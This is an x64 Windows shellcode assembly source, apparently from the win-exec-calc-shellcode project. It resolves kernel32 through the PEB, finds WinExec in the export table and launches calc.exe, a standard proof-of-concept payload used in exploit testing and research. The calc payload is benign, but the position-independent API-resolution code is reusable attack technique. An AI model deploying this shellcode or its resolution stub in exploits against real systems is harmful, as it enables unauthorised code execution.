; Copyright (c) 2009-2011, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com> and Peter Ferrie <peter.ferrie@gmail.com>
; Windows x64 null-free shellcode that executes calc.exe.
; Works in any x64 application for Windows 5.0-7.0 all service packs.
; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.
BITS 64
SECTION .text

%include 'type-conversion.asm'

%ifndef PLATFORM_INDEPENDENT
global shellcode
shellcode:
%endif

%ifdef STACK_ALIGN
    AND     SP, 0xFFF8
%endif

%ifndef PLATFORM_INDEPENDENT
    PUSH    BYTE 0x60                     ; 
    POP     RCX                           ; RCX = 0x60
%else
    MOV     CL, 0x60                      ; RCX = 0x60
%endif
    MOV     RSI, [GS:RCX]                 ; RSI = [TEB + 0x60] = PEB
    MOV     ESI, [RSI + 0x18]             ; RSI = [PEB + 0x18] = PEB_LDR_DATA
    MOV     ESI, [RSI + 0x10]             ; RSI = [PEB_LDR_DATA + 0x18] = LDR_MODULE InLoadOrder[0] (process)
    LODSD                                 ; RAX = InLoadOrder[1] (ntdll)
    MOV     ESI, [RAX]                    ; RSI = InLoadOrder[2] (kernel32)
    ;for compatibility reasons, Microsoft places kernel32 < 2Gb (and even ntdll but not kernelbase)
    MOV     EDI, [RSI + 0x30]             ; RDI = [InLoadOrder[2] + 0x30] = kernel32 DllBase
; Found kernel32 base address (RDI)
    ADD     ECX, DWORD [RDI + 0x3C]       ; RBX = 0x60 + [kernel32 + 0x3C] = offset(PE header) + 0x60
    MOV     EBX, DWORD [RDI + RCX + 0x28] ; EBX = [kernel32 + offset(PE header) + 0x88] = offset(export table)
; Found export table offset (RBX)
    MOV     ESI, DWORD [RDI + RBX + 0x20] ; RSI = [kernel32 + offset(export table) + 0x20] = offset(names table)
    ADD     ESI, EDI                      ; RSI = kernel32 + offset(names table) = &(names table)
; Found export names table (RSI)
    MOV     ECX, DWORD [RDI + RBX + 0x24] ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
    ADD     ECX, EDI                      ; RCX = kernel32 + offset(ordinals table) = ordinals table
; Found export ordinals table (RCX)
    CDQ                                   ; RDX = 0 (eax == userland addresss, so MSB is not set)
find_winexec_x64:
    INC     EDX                           ; RDX = function number + 1
    LODSD                                 ; RAX = &(names table[function number]) = offset(function name)
    CMP     [RDI + RAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
    JNE     find_winexec_x64              ;
; Found WinExec ordinal (RDX)
    MOVZX   EDX, WORD [RCX + RDX * 2 - 2]
                                          ; RDX = [ordinals table + (WinExec function number + 1) * 2 - 2] = WinExec function ordinal
    MOV     ESI, DWORD [RDI + RBX + 0x1C] ; RSI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
    ADD     ESI, EDI                      ; RSI = kernel32 + offset(address table) = &(address table)
    ADD     EDI, [RSI + RDX * 4]          ; RDI = kernel32 + &(address table)[WinExec ordinal] = kernel32 + offset(WinExec) = WinExec
; Found WinExec (RDI)
    PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
    PUSH    RSP
    POP     RCX                           ; RCX = &("calc")
    PUSH    RCX                           ; WinExec messes with stack - 
    CDQ                                   ; RDX = 0
    CALL    RDI                           ; WinExec(&("calc"), 0);
    INT3                                  ; Crash
